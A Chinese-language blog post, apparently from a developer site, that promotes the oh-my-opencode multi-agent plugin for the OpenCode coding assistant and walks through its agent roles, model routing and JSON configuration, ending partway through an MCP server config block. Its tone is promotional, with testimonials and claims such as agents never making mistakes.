pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="vs2015">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1e1e1e;color:#dcdcdc}.hljs-keyword,.hljs-link,.hljs-literal,.hljs-name,.hljs-symbol{color:#569cd6}.hljs-link{text-decoration:underline}.hljs-built_in,.hljs-type{color:#4ec9b0}.hljs-class,.hljs-number{color:#b8d7a3}.hljs-meta-string,.hljs-string{color:#d69d85}.hljs-regexp,.hljs-template-tag{color:#9a5334}.hljs-formula,.hljs-function,.hljs-params,.hljs-subst,.hljs-title{color:#dcdcdc}.hljs-comment,.hljs-quote{color:#57a64a;font-style:italic}.hljs-doctag{color:#608b4e}.hljs-meta,.hljs-meta-keyword,.hljs-tag{color:#9b9b9b}.hljs-template-variable,.hljs-variable{color:#bd63c5}.hljs-attr,.hljs-attribute,.hljs-builtin-name{color:#9cdcfe}.hljs-section{color:gold}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-bullet,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-selector-tag{color:#d7ba7d}.hljs-addition{background-color:#144212}.hljs-addition,.hljs-deletion{display:inline-block;width:100%}.hljs-deletion{background-color:#600}</style><h2 data-id="heading-0">Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南</h2>
<blockquote>
<p><strong>开挂级别的编程体验</strong>——这就是 oh-my-opencode 的实战效果。</p>
</blockquote>
<blockquote>
<p>前言：如果你热爱编程和计算机，OpenCode 就是那个从 Windows 切换到 Linux 的兴奋时刻。但学习成本很高？<strong>Oh-My-OpenCode 让你的智能体像真正的开发团队一样工作，开箱即用。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-1">🔥 为什么选择 Oh-My-OpenCode？</h3>
<p>在 AI 编程时代，<strong>Claude Code 很棒，OpenCode 更棒</strong>——无限可扩展、无限可定制、零屏幕闪烁。但问题是：<strong>需要学习的东西很多，很复杂，而你的时间很宝贵。</strong></p>
<p>Oh-My-OpenCode 解决了这个问题。它不是一个简单的配置插件，而是<strong>一个完整的智能体协作系统</strong>。</p>
<h4 data-id="heading-2">核心优势（你可能再也回不去了）</h4>
<h5 data-id="heading-3">1️⃣ <strong>Sisyphus：像你一样编码的主智能体</strong></h5>
<p>在希腊神话中，西西弗斯因欺骗众神而被惩罚永恒地将巨石推上山坡。<strong>LLM 智能体和我们没有区别</strong>——它们每天推动着"石头"（思考）。</p>
<p>Sisyphus 的设计哲学：</p>
<ul>
<li>✅ <strong>不会浪费时间自己寻找文件</strong>：保持上下文精简，向更快、更便宜的模型并行发起后台任务</li>
<li>✅ <strong>利用 LSP 进行重构</strong>：更确定性、更安全、更精准</li>
<li>✅ <strong>将繁重的前端任务委派给 Gemini 3 Pro</strong></li>
<li>✅ <strong>遇到瓶颈时召唤 GPT 5.2 进行高智商战略支援</strong></li>
<li>✅ <strong>受 TODO 列表约束</strong>：系统会强制它回到"推石头"模式——<strong>你的任务会被完成，句号。</strong></li>
</ul>
<blockquote>
<p><strong>用户评价</strong>："如果 Claude Code 能在 7 天内完成人类 3 个月的工作，那么 Sisyphus 只需 1 小时。它会持续工作直到任务完成。它是一个非常自律的智能体。" —— B, 量化研究员</p>
</blockquote>
<h5 data-id="heading-4">2️⃣ <strong>专业智能体团队：各司其职</strong></h5>
<p>Oh-My-OpenCode 不是单打独斗，而是一个<strong>完整的开发团队</strong>：</p>








































<table><thead><tr><th>智能体</th><th>职责</th><th>为什么这样设计</th></tr></thead><tbody><tr><td><strong>Sisyphus</strong></td><td>主编排器、持续执行</td><td>像团队负责人一样协调资源</td></tr><tr><td><strong>Prometheus</strong></td><td>规划器</td><td>制定策略，而非盲目执行</td></tr><tr><td><strong>Oracle</strong></td><td>架构设计、复杂调试</td><td>需要深度推理</td></tr><tr><td><strong>Librarian</strong></td><td>官方文档、代码库探索</td><td>擅长检索和组织信息</td></tr><tr><td><strong>Explore</strong></td><td>极速代码库 grep（AST 感知）</td><td>快速定位，上下文感知</td></tr><tr><td><strong>Multimodal Looker</strong></td><td>图像/PDF 分析</td><td>多模态能力</td></tr></tbody></table>
<p><strong>真实案例</strong>：45k 行 Tauri 应用 → 一夜之间转换成 SaaS Web 应用</p>
<blockquote>
<p>"我使用 ohmyopencode 和 ralph loop 在一夜之间将一个 45k 行的 tauri 应用转换成了 SaaS Web 应用。看着它工作非常精彩，今早醒来发现网站基本上已经可以运行了！" — James Hargis</p>
</blockquote>
<h5 data-id="heading-5">3️⃣ <strong>Hephaestus：自主深度工作者</strong></h5>
<p>在希腊神话中，赫菲斯托斯是神圣的铁匠——以无与伦比的精准和奉献打造武器。<strong>Oh-My-OpenCode 引入了 Hephaestus（GPT 5.2 Codex Medium）：合法的工匠代理。</strong></p>
<p><strong>Hephaestus 的革命性特性：</strong></p>





























<table><thead><tr><th>特性</th><th>价值</th></tr></thead><tbody><tr><td><strong>目标导向</strong></td><td>给他目标，不是配方。他自己决定步骤。</td></tr><tr><td><strong>行动前探索</strong></td><td>写代码前，并行启动 2-5 个 explore/librarian 代理。</td></tr><tr><td><strong>端到端完成</strong></td><td>有验证证据证明 100% 完成之前不会停止。</td></tr><tr><td><strong>模式匹配</strong></td><td>搜索现有代码库以匹配项目风格——没有 AI 垃圾。</td></tr><tr><td><strong>合法的精准</strong></td><td>像大师铁匠一样编写代码——精准、最小化、只做需要的。</td></tr></tbody></table>
<p><strong>灵感来源</strong>：AmpCode 的深度模式——在采取决定性行动之前进行彻底研究的自主问题解决。</p>
<h5 data-id="heading-6">4️⃣ <strong>🪄 魔法词：<code>ultrawork</code>（或 <code>ulw</code>）</strong></h5>
<p><strong>不想读完文档？只需在你的提示中包含 <code>ultrawork</code> 或 <code>ulw</code>。</strong></p>
<p>就这样。所有功能像魔法一样运行：</p>
<ul>
<li>✅ 并行智能体</li>
<li>✅ 后台任务</li>
<li>✅ 深度探索</li>
<li>✅ 不懈执行直到完成</li>
</ul>
<p>智能体自动理解其余的。<strong>其实，打 <code>ulw</code> 太费劲了。就 <code>ulw</code>。喝杯咖啡。你的工作完成了。</strong></p>
<h5 data-id="heading-7">5️⃣ <strong>并行智能体：像真正的开发团队</strong></h5>
<p>Oh-My-OpenCode 的后台智能体功能：</p>
<ul>
<li><strong>并行运行多个智能体</strong></li>
<li><strong>按提供商/模型配置并发限制</strong></li>
<li><strong>像真正的开发团队一样协作</strong></li>
</ul>
<p><strong>实际效果：</strong> Sisyphus 保持主智能体的上下文精简，向更快、更便宜的模型并行发起后台任务，让它们为他绘制地图。</p>
<h5 data-id="heading-8">6️⃣ <strong>Todo 继续执行器：强制完成</strong></h5>
<p>这是让 Sisyphus 继续推动巨石的关键：</p>
<ul>
<li>✅ 如果智能体中途退出，强制它继续</li>
<li>✅ 你的任务会被完成，句号</li>
</ul>
<blockquote>
<p><strong>真实案例</strong>："用 Oh My Opencode 仅用一天就清理了 8000 个 eslint 警告" — Jacob Ferrari</p>
</blockquote>
<h5 data-id="heading-9">7️⃣ <strong>LSP &amp; AST 工具：确定性重构</strong></h5>

























<table><thead><tr><th>能力</th><th>价值</th></tr></thead><tbody><tr><td><strong>重构</strong></td><td>像人类一样精确</td></tr><tr><td><strong>重命名</strong></td><td>不遗漏任何引用</td></tr><tr><td><strong>诊断</strong></td><td>精准定位问题</td></tr><tr><td><strong>AST 感知代码搜索</strong></td><td>语义级别搜索，不是文本匹配</td></tr></tbody></table>
<p><strong>LSP 按文件自动激活</strong>：CSS（vscode-css-language-server），支持 <code>.css</code>, <code>.scss</code>, <code>.sass</code>, <code>.less</code></p>
<h5 data-id="heading-10">8️⃣ <strong>上下文智能管理：多智能体分担</strong></h5>
<p>Oh-My-OpenCode 积极利用多个智能体来减轻上下文负担：</p>
<ul>
<li><strong>你的智能体现在是开发团队负责人</strong></li>
<li><strong>你是 AI 经理</strong></li>
</ul>
<p>不再需要担心上下文管理，已经处理好了。</p>
<h5 data-id="heading-11">9️⃣ <strong>开箱即用：电池已包含</strong></h5>
<p>所有功能默认启用。你不需要做任何事情：</p>
<ul>
<li>✅ 智能体团队</li>
<li>✅ 后台任务</li>
<li>✅ LSP/AST 支持</li>
<li>✅ Todo 执行器</li>
<li>✅ MCP 插件</li>
</ul>
<h5 data-id="heading-12">🔟 <strong>注释检查器：保持代码库整洁</strong></h5>
<ul>
<li>✅ 防止 AI 添加过多注释</li>
<li>✅ Sisyphus 生成的代码与人类编写的代码无法区分</li>
</ul>
<h5 data-id="heading-13">1️⃣1️⃣ <strong>精选 MCP：即时可用</strong></h5>
<p>开箱即用的 MCP 插件：</p>
<ul>
<li><strong>Exa</strong>：高质量网页搜索</li>
<li><strong>Context7</strong>：官方文档智能查询</li>
<li><strong>Grep.app</strong>：GitHub 代码搜索</li>
</ul>
<h5 data-id="heading-14">1️⃣2️⃣ <strong>Claude Code 完整兼容性</strong></h5>
<ul>
<li>✅ Command</li>
<li>✅ Agent</li>
<li>✅ Skill</li>
<li>✅ MCP</li>
<li>✅ Hook（PreToolUse、PostToolUse、UserPromptSubmit、Stop）</li>
</ul>
<hr/>
<h3 data-id="heading-15">📦 安装与配置</h3>
<h4 data-id="heading-16">方式一：直接安装（推荐）</h4>
<p>只需在 <code>~/.config/opencode/opencode.json</code> 中添加插件：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugin"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"opencode-antigravity-auth@latest"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"oh-my-opencode@latest"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>就是这样。<strong>直接安装就行。开箱即用，电池已包含。</strong></p>
<h4 data-id="heading-17">方式二：让智能体安装</h4>
<p>复制以下提示并粘贴到你的 LLM 智能体（Claude Code、AmpCode、Cursor 等）：</p>
<pre><code class="hljs language-perl" lang="perl">按照以下说明安装和配置 oh-<span class="hljs-keyword">my</span>-opencode：
https:<span class="hljs-regexp">//ra</span>w.githubusercontent.com/code-yeongyu/oh-<span class="hljs-keyword">my</span>-opencode/refs/heads/master/docs/guide/installation.md
</code></pre>
<p><strong>我们强烈建议让智能体来处理。人会犯错，智能体不会。</strong></p>
<hr/>
<h3 data-id="heading-18">⚙️ 核心配置详解</h3>
<h4 data-id="heading-19">主配置文件：oh-my-opencode.json</h4>
<p>配置文件位置：</p>
<ul>
<li><strong>用户级</strong>：<code>~/.config/opencode/oh-my-opencode.json</code></li>
<li><strong>项目级</strong>：<code>.opencode/oh-my-opencode.json</code>（优先级更高）</li>
</ul>
<p>支持 <strong>JSONC</strong>（带注释和尾随逗号的 JSON）。</p>
<h4 data-id="heading-20">Agent 配置：专业化的智能体</h4>
<p>以下是我的生产环境配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"$schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://raw.githubusercontent.com/code-yeongyu/oh-my-opencode/master/assets/oh-my-opencode.schema.json"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"oracle"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"librarian"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"explore"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/gemini-3-flash-preview"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"multimodal-looker"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prometheus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"metis"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-21">为什么这样配置？</h5>













































<table><thead><tr><th>Agent</th><th>模型选择</th><th>理由</th></tr></thead><tbody><tr><td><strong>sisyphus</strong></td><td>Claude Opus 4.5</td><td>强推理，主编排需要深度思考</td></tr><tr><td><strong>oracle</strong></td><td>Claude Opus 4.5</td><td>架构设计和调试需要强推理</td></tr><tr><td><strong>librarian</strong></td><td>Claude Sonnet 4.5</td><td>文档搜索和代码组织，平衡速度和质量</td></tr><tr><td><strong>explore</strong></td><td>Gemini 3 Flash</td><td>100万+ tokens，快速代码库探索</td></tr><tr><td><strong>multimodal-looker</strong></td><td>Claude Opus 4.5</td><td>多模态分析需要强推理</td></tr><tr><td><strong>prometheus</strong></td><td>Claude Opus 4.5</td><td>规划策略需要强推理</td></tr><tr><td><strong>metis</strong></td><td>Claude Opus 4.5</td><td>需求分析和歧义识别需要强推理</td></tr></tbody></table>
<h4 data-id="heading-22">Category 配置：任务分类路由</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"categories"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"visual-engineering"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"ultrabrain"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"artistry"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"quick"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/gemini-3-flash-preview"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"unspecified-low"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"unspecified-high"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"writing"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4.5"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-23">Sisyphus Agent 配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"sisyphus_agent"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"default_builder_enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"replace_plan"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong>default_builder_enabled</strong>：启用默认构建器</li>
<li><strong>replace_plan</strong>：不替换原始计划（保留 Prometheus 的规划）</li>
</ul>
<h4 data-id="heading-24">LSP 配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"lsp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"css"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"vscode-css-language-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--stdio"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"extensions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">".css"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".scss"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".sass"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".less"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-25">后台任务配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"background_task"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"max_concurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>配置并发限制，防止资源耗尽。</p>
<hr/>
<h3 data-id="heading-26">🛠️ MCP 插件生态</h3>
<p>Oh-My-OpenCode 内置精选的 MCP 插件：</p>



































<table><thead><tr><th>插件</th><th>类型</th><th>功能</th></tr></thead><tbody><tr><td><strong>Exa</strong></td><td>remote</td><td>高质量网页搜索</td></tr><tr><td><strong>Context7</strong></td><td>local</td><td>官方文档智能查询</td></tr><tr><td><strong>Grep.app</strong></td><td>remote</td><td>GitHub 代码搜索</td></tr><tr><td><strong>Fetch</strong></td><td>local</td><td>网页抓取与解析</td></tr><tr><td><strong>Playwright</strong></td><td>local</td><td>浏览器自动化</td></tr></tbody></table>
<h4 data-id="heading-27">额外 MCP 插件（需要手动配置）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"deepwiki"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"remote"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.deepwiki.com/mcp"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"web-search-prime"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"remote"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://open.bigmodel.cn/api/mcp/web_search_prime/mcp"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"zai-mcp-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"@z_ai/mcp-server"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span>
    <span class="hljs-punctuation">}</span>
